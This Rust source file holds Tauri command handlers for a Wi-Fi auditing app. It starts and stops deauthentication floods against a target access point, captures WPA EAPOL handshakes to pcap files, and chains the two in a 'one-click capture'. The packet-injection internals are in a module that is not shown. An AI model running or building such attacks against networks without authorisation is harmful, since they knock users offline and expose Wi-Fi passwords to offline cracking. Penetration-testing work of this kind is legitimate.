//! Tauri IPC command handlers for offensive audit operations.
//!
//! Exposes the deauthentication injection and EAPOL handshake capture
//! functions from `network::audit` as Tauri commands invokable by the
//! React frontend.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

use log::info;
use serde::{Deserialize, Serialize};
use tauri::Emitter;

use crate::error::AetherError;
use crate::network::audit;

// ─────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────

/// Result payload for deauth injection.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeauthResult {
    pub success: bool,
    pub message: String,
    pub bssid: String,
    pub packets_sent: u32,
    pub packets_total: u32,
    pub stopped_early: bool,
}

/// Result payload for handshake capture operations.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HandshakeResult {
    pub success: bool,
    pub message: String,
    pub pcap_path: Option<String>,
}

/// Status for the full "one-click capture" operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CaptureOperationStatus {
    pub phase: String,
    pub message: String,
    pub progress: f32,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub packets_sent: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub packets_total: Option<u32>,
}

// ─────────────────────────────────────────────────
// State: tracks active EAPOL capture and deauth
// ─────────────────────────────────────────────────

/// Managed Tauri state for the EAPOL handshake capture session.
pub struct EapolCaptureState(pub Arc<Mutex<Option<Arc<AtomicBool>>>>);

/// Managed Tauri state for active deauth operations.
pub struct DeauthState(pub Arc<Mutex<Option<Arc<AtomicBool>>>>);

// ─────────────────────────────────────────────────
// Commands
// ─────────────────────────────────────────────────

/// Parse a MAC address string like "AA:BB:CC:DD:EE:FF" into 6 bytes.
fn parse_mac(mac_str: &str) -> Result<[u8; 6], AetherError> {
    let parts: Vec<&str> = mac_str.split(':').collect();
    if parts.len() != 6 {
        return Err(AetherError::CommandFailed {
            command: "parse_mac".into(),
            detail: format!(
                "Invalid MAC address format: '{}'. Expected XX:XX:XX:XX:XX:XX",
                mac_str
            ),
        });
    }

    let mut bytes = [0u8; 6];
    for (i, part) in parts.iter().enumerate() {
        bytes[i] = u8::from_str_radix(part, 16).map_err(|_| AetherError::CommandFailed {
            command: "parse_mac".into(),
            detail: format!("Invalid hex byte '{}' in MAC address '{}'", part, mac_str),
        })?;
    }

    Ok(bytes)
}

/// Send a broadcast deauthentication frame targeting a specific BSSID.
/// This version runs in a background thread and can be stopped.
///
/// # Frontend Usage
/// ```typescript
/// const result = await invoke('start_deauth', {
///   interfaceName: 'wlan0mon',
///   bssid: 'AA:BB:CC:DD:EE:FF',
///   count: 5,
///   intervalMs: 100
/// });
/// ```
#[tauri::command]
pub fn start_deauth(
    interface_name: String,
    bssid: String,
    count: Option<u32>,
    interval_ms: Option<u64>,
    state: tauri::State<'_, DeauthState>,
    app_handle: tauri::AppHandle,
) -> Result<DeauthResult, AetherError> {
    info!(
        "[cmd] start_deauth: interface={}, bssid={}, count={:?}, interval_ms={:?}",
        interface_name, bssid, count, interval_ms
    );

    let mut guard = state
        .0
        .lock()
        .map_err(|e| AetherError::CaptureError(format!("Lock poisoned: {}", e)))?;

    if guard.is_some() {
        return Err(AetherError::CaptureAlreadyRunning("Deauth attack".into()));
    }

    let mac_bytes = parse_mac(&bssid)?;
    let send_count = count.unwrap_or(3);
    let interval = interval_ms.unwrap_or(100);

    let stop_flag = Arc::new(AtomicBool::new(false));
    let flag_clone = Arc::clone(&stop_flag);
    let iface_clone = interface_name.clone();
    let bssid_clone = bssid.clone();
    let handle = app_handle.clone();

    // Clone state Arc so the thread can clear it when done
    let state_arc = Arc::clone(&state.0);

    // Spawn the deauth in a background thread
    std::thread::spawn(move || {
        let mut packets_sent: u32 = 0;

        // Emit "started" event
        let _ = handle.emit(
            "deauth-status",
            CaptureOperationStatus {
                phase: "deauth".into(),
                message: format!("Starting deauth attack on {}...", bssid_clone),
                progress: 0.0,
                packets_sent: Some(0),
                packets_total: Some(send_count),
            },
        );

        for i in 0..send_count {
            // Check if we should stop
            if flag_clone.load(Ordering::Relaxed) {
                let _ = handle.emit(
                    "deauth-status",
                    CaptureOperationStatus {
                        phase: "stopped".into(),
                        message: format!(
                            "Deauth attack stopped. Sent {} of {} packets.",
                            packets_sent, send_count
                        ),
                        progress: packets_sent as f32 / send_count as f32,
                        packets_sent: Some(packets_sent),
                        packets_total: Some(send_count),
                    },
                );
                // Clear state before returning
                if let Ok(mut guard) = state_arc.lock() {
                    *guard = None;
                }
                return;
            }

            match audit::inject_broadcast_deauth(&iface_clone, &mac_bytes) {
                Ok(()) => {
                    packets_sent += 1;
                    let _ = handle.emit(
                        "deauth-status",
                        CaptureOperationStatus {
                            phase: "deauth".into(),
                            message: format!(
                                "Sent deauth packet {}/{} to {}",
                                packets_sent, send_count, bssid_clone
                            ),
                            progress: packets_sent as f32 / send_count as f32,
                            packets_sent: Some(packets_sent),
                            packets_total: Some(send_count),
                        },
                    );
                }
                Err(e) => {
                    let _ = handle.emit(
                        "deauth-status",
                        CaptureOperationStatus {
                            phase: "error".into(),
                            message: format!(
                                "Deauth injection failed on packet {}/{}: {}",
                                i + 1,
                                send_count,
                                e
                            ),
                            progress: packets_sent as f32 / send_count as f32,
                            packets_sent: Some(packets_sent),
                            packets_total: Some(send_count),
                        },
                    );
                    // Clear state before returning
                    if let Ok(mut guard) = state_arc.lock() {
                        *guard = None;
                    }
                    return;
                }
            }

            // Sleep between packets (but not after the last one)
            if i < send_count - 1 {
                std::thread::sleep(std::time::Duration::from_millis(interval));
            }
        }

        // Emit completion
        let _ = handle.emit(
            "deauth-status",
            CaptureOperationStatus {
                phase: "complete".into(),
                message: format!(
                    "Deauth attack complete. Sent {} packets to {}",
                    packets_sent, bssid_clone
                ),
                progress: 1.0,
                packets_sent: Some(packets_sent),
                packets_total: Some(send_count),
            },
        );

        // Clear state so a new attack can be started
        if let Ok(mut guard) = state_arc.lock() {
            *guard = None;
        }
    });

    *guard = Some(stop_flag);

    Ok(DeauthResult {
        success: true,
        message: format!(
            "Deauth attack started against {}. Sending {} packets with {}ms interval.",
            bssid, send_count, interval
        ),
        bssid,
        packets_sent: 0,
        packets_total: send_count,
        stopped_early: false,
    })
}

/// Stop the active deauth attack.
#[tauri::command]
pub fn stop_deauth(state: tauri::State<'_, DeauthState>) -> Result<DeauthResult, AetherError> {
    info!("[cmd] stop_deauth");

    let mut guard = state
        .0
        .lock()
        .map_err(|e| AetherError::CaptureError(format!("Lock poisoned: {}", e)))?;

    match guard.take() {
        Some(flag) => {
            flag.store(true, Ordering::Relaxed);
            Ok(DeauthResult {
                success: true,
                message: "Deauth attack stop signal sent.".into(),
                bssid: String::new(),
                packets_sent: 0,
                packets_total: 0,
                stopped_early: true,
            })
        }
        None => Ok(DeauthResult {
            success: true,
            message: "No deauth attack was running.".into(),
            bssid: String::new(),
            packets_sent: 0,
            packets_total: 0,
            stopped_early: false,
        }),
    }
}

/// Start capturing EAPOL (WPA handshake) packets and saving to a .pcap file.
///
/// Runs in a background thread. The capture can be stopped with `stop_eapol_capture`.
///
/// # Frontend Usage
/// ```typescript
/// const result = await invoke('start_eapol_capture', {
///   interfaceName: 'wlan0mon',
///   outputPath: '/tmp/handshake.pcap'
/// });
/// ```
#[tauri::command]
pub fn start_eapol_capture(
    interface_name: String,
    output_path: Option<String>,
    state: tauri::State<'_, EapolCaptureState>,
    app_handle: tauri::AppHandle,
) -> Result<HandshakeResult, AetherError> {
    info!("[cmd] start_eapol_capture: interface={}", interface_name);

    let mut guard = state
        .0
        .lock()
        .map_err(|e| AetherError::CaptureError(format!("Lock poisoned: {}", e)))?;

    if guard.is_some() {
        return Err(AetherError::CaptureAlreadyRunning("EAPOL capture".into()));
    }

    // Generate output path if not provided
    let pcap_path = output_path.unwrap_or_else(|| {
        std::fs::create_dir_all("./captures").ok();
        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        format!("./captures/aether_handshake_{}.pcap", ts)
    });

    let stop_flag = Arc::new(AtomicBool::new(false));
    let flag_clone = Arc::clone(&stop_flag);
    let path_clone = pcap_path.clone();
    let iface_clone = interface_name.clone();

    // Emit status events to the frontend
    let handle = app_handle.clone();

    // Clone the state Arc so the thread can clear it when done
    let state_arc = Arc::clone(&state.0);

    // Spawn the capture in a background thread
    std::thread::spawn(move || {
        // Emit "started" event
        let _ = handle.emit(
            "eapol-status",
            CaptureOperationStatus {
                phase: "capturing".into(),
                message: format!("Listening for EAPOL packets on {}...", iface_clone),
                progress: 0.5,
                packets_sent: None,
                packets_total: None,
            },
        );

        match audit::capture_and_save_eapol(&iface_clone, &path_clone, flag_clone) {
            Ok(()) => {
                let _ = handle.emit(
                    "eapol-status",
                    CaptureOperationStatus {
                        phase: "complete".into(),
                        message: format!("Handshake saved to {}", path_clone),
                        progress: 1.0,
                        packets_sent: None,
                        packets_total: None,
                    },
                );
            }
            Err(e) => {
                let _ = handle.emit(
                    "eapol-status",
                    CaptureOperationStatus {
                        phase: "error".into(),
                        message: format!("EAPOL capture error: {}", e),
                        progress: 0.0,
                        packets_sent: None,
                        packets_total: None,
                    },
                );
            }
        }

        // Clear the state so a new capture can be started
        if let Ok(mut guard) = state_arc.lock() {
            *guard = None;
        }
    });

    *guard = Some(stop_flag);

    Ok(HandshakeResult {
        success: true,
        message: format!("EAPOL capture started. Saving to {}", pcap_path),
        pcap_path: Some(pcap_path),
    })
}

/// Stop the active EAPOL capture session.
#[tauri::command]
pub fn stop_eapol_capture(
    state: tauri::State<'_, EapolCaptureState>,
) -> Result<HandshakeResult, AetherError> {
    info!("[cmd] stop_eapol_capture");

    let mut guard = state
        .0
        .lock()
        .map_err(|e| AetherError::CaptureError(format!("Lock poisoned: {}", e)))?;

    match guard.take() {
        Some(flag) => {
            flag.store(true, Ordering::Relaxed);
            Ok(HandshakeResult {
                success: true,
                message: "EAPOL capture stopped.".into(),
                pcap_path: None,
            })
        }
        None => Ok(HandshakeResult {
            success: true,
            message: "No EAPOL capture was running.".into(),
            pcap_path: None,
        }),
    }
}

/// Execute a "one-click" handshake capture sequence:
/// 1. Send deauth frames to force client reconnection
/// 2. Start EAPOL capture to catch the handshake
///
/// This is the "1-Click Capture" feature from the blueprint.
#[tauri::command]
pub fn one_click_capture(
    interface_name: String,
    bssid: String,
    deauth_count: Option<u32>,
    deauth_interval_ms: Option<u64>,
    output_path: Option<String>,
    state: tauri::State<'_, EapolCaptureState>,
    deauth_state: tauri::State<'_, DeauthState>,
    app_handle: tauri::AppHandle,
) -> Result<HandshakeResult, AetherError> {
    info!(
        "[cmd] one_click_capture: interface={}, bssid={}",
        interface_name, bssid
    );

    let mac_bytes = parse_mac(&bssid)?;
    let count = deauth_count.unwrap_or(5);
    let interval = deauth_interval_ms.unwrap_or(100);

    // Generate output path
    let pcap_path = output_path.unwrap_or_else(|| {
        std::fs::create_dir_all("./captures").ok();
        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        format!("./captures/aether_{}_{}.pcap", bssid.replace(':', ""), ts)
    });

    // Check if EAPOL capture is already running
    let mut eapol_guard = state
        .0
        .lock()
        .map_err(|e| AetherError::CaptureError(format!("Lock poisoned: {}", e)))?;

    if eapol_guard.is_some() {
        return Err(AetherError::CaptureAlreadyRunning("EAPOL capture".into()));
    }

    // Check if deauth is already running
    let mut deauth_guard = deauth_state
        .0
        .lock()
        .map_err(|e| AetherError::CaptureError(format!("Lock poisoned: {}", e)))?;

    if deauth_guard.is_some() {
        return Err(AetherError::CaptureAlreadyRunning("Deauth attack".into()));
    }

    let eapol_stop_flag = Arc::new(AtomicBool::new(false));
    let deauth_stop_flag = Arc::new(AtomicBool::new(false));
    let eapol_flag_clone = Arc::clone(&eapol_stop_flag);
    let deauth_flag_clone = Arc::clone(&deauth_stop_flag);
    let path_clone = pcap_path.clone();
    let iface_clone = interface_name.clone();
    let bssid_clone = bssid.clone();
    let handle = app_handle.clone();

    // Clone state Arcs so the thread can clear them when done
    let eapol_state_arc = Arc::clone(&state.0);
    let deauth_state_arc = Arc::clone(&deauth_state.0);

    std::thread::spawn(move || {
        // Phase 1: Start EAPOL listener first (so we don't miss the handshake)
        let _ = handle.emit(
            "eapol-status",
            CaptureOperationStatus {
                phase: "setup".into(),
                message: "Arming EAPOL listener...".into(),
                progress: 0.1,
                packets_sent: None,
                packets_total: None,
            },
        );

        // Phase 2: Send deauth frames
        let _ = handle.emit(
            "eapol-status",
            CaptureOperationStatus {
                phase: "deauth".into(),
                message: format!("Transmitting {} deauth frames to {}...", count, bssid_clone),
                progress: 0.3,
                packets_sent: Some(0),
                packets_total: Some(count),
            },
        );

        let mut packets_sent: u32 = 0;
        for i in 0..count {
            // Check if we should stop
            if deauth_flag_clone.load(Ordering::Relaxed) {
                let _ = handle.emit(
                    "eapol-status",
                    CaptureOperationStatus {
                        phase: "stopped".into(),
                        message: format!(
                            "Attack stopped. Sent {} of {} deauth packets.",
                            packets_sent, count
                        ),
                        progress: 0.0,
                        packets_sent: Some(packets_sent),
                        packets_total: Some(count),
                    },
                );
                // Clear state before returning
                if let Ok(mut guard) = eapol_state_arc.lock() { *guard = None; }
                if let Ok(mut guard) = deauth_state_arc.lock() { *guard = None; }
                return;
            }

            if let Err(e) = audit::inject_broadcast_deauth(&iface_clone, &mac_bytes) {
                let _ = handle.emit(
                    "eapol-status",
                    CaptureOperationStatus {
                        phase: "error".into(),
                        message: format!("Deauth injection failed: {}", e),
                        progress: 0.0,
                        packets_sent: Some(packets_sent),
                        packets_total: Some(count),
                    },
                );
                // Clear state before returning
                if let Ok(mut guard) = eapol_state_arc.lock() { *guard = None; }
                if let Ok(mut guard) = deauth_state_arc.lock() { *guard = None; }
                return;
            }

            packets_sent += 1;

            // Emit progress
            let _ = handle.emit(
                "eapol-status",
                CaptureOperationStatus {
                    phase: "deauth".into(),
                    message: format!("Sent deauth {}/{} to {}", packets_sent, count, bssid_clone),
                    progress: 0.3 + (0.2 * (packets_sent as f32 / count as f32)),
                    packets_sent: Some(packets_sent),
                    packets_total: Some(count),
                },
            );

            // Small delay between deauth bursts
            if i < count - 1 {
                std::thread::sleep(std::time::Duration::from_millis(interval));
            }
        }

        // Phase 3: Listen for EAPOL
        let _ = handle.emit(
            "eapol-status",
            CaptureOperationStatus {
                phase: "capturing".into(),
                message: "Listening for EAPOL handshake packets...".into(),
                progress: 0.5,
                packets_sent: Some(count),
                packets_total: Some(count),
            },
        );

        match audit::capture_and_save_eapol(&iface_clone, &path_clone, eapol_flag_clone) {
            Ok(()) => {
                let _ = handle.emit(
                    "eapol-status",
                    CaptureOperationStatus {
                        phase: "complete".into(),
                        message: format!("Handshake captured! Saved to {}", path_clone),
                        progress: 1.0,
                        packets_sent: Some(count),
                        packets_total: Some(count),
                    },
                );
            }
            Err(e) => {
                let _ = handle.emit(
                    "eapol-status",
                    CaptureOperationStatus {
                        phase: "error".into(),
                        message: format!("Capture error: {}", e),
                        progress: 0.0,
                        packets_sent: Some(count),
                        packets_total: Some(count),
                    },
                );
            }
        }

        // Clear state so new captures can be started
        if let Ok(mut guard) = eapol_state_arc.lock() {
            *guard = None;
        }
        if let Ok(mut guard) = deauth_state_arc.lock() {
            *guard = None;
        }
    });

    *eapol_guard = Some(eapol_stop_flag);
    *deauth_guard = Some(deauth_stop_flag);

    Ok(HandshakeResult {
        success: true,
        message: format!(
            "One-click capture initiated against {}. Sending {} deauth packets with {}ms interval. Saving to {}",
            bssid, count, interval, pcap_path
        ),
        pcap_path: Some(pcap_path),
    })
}

/// Stop any active attack (both deauth and EAPOL capture).
#[tauri::command]
pub fn stop_all_attacks(
    eapol_state: tauri::State<'_, EapolCaptureState>,
    deauth_state: tauri::State<'_, DeauthState>,
) -> Result<HandshakeResult, AetherError> {
    info!("[cmd] stop_all_attacks");

    // Stop EAPOL capture
    if let Ok(mut guard) = eapol_state.0.lock() {
        if let Some(flag) = guard.take() {
            flag.store(true, Ordering::Relaxed);
        }
    }

    // Stop deauth
    if let Ok(mut guard) = deauth_state.0.lock() {
        if let Some(flag) = guard.take() {
            flag.store(true, Ordering::Relaxed);
        }
    }

    Ok(HandshakeResult {
        success: true,
        message: "All attacks stopped.".into(),
        pcap_path: None,
    })
}
